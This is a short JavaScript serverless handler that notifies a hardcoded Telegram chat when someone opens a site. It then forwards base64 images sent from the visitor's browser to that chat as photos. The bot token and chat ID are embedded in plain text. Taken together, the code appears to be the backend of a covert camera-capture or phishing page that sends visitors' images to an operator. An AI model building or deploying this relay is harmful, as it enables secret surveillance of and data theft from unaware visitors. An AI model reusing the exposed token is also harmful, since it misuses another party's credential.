import fetch from 'node-fetch';
import FormData from 'form-data';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const BOT_TOKEN = '8098677151:AAHw3ofWspeagUJWjWejk91whH9z9y_PoYA';
  const CHAT_ID = '802683583';

  try {
    if (req.body.notify) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Someone opened the site!' })
      });
      return res.status(200).json({ ok: true });
    }

    const { image } = req.body;
    if (!image) return res.status(400).json({ message: 'No image provided' });

    const buffer = Buffer.from(image.split(',')[1], 'base64');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, 'photo.jpg');

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });
    const data = await response.json();

    res.status(200).json({ ok: true, telegram: data });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: err.message });
  }
}
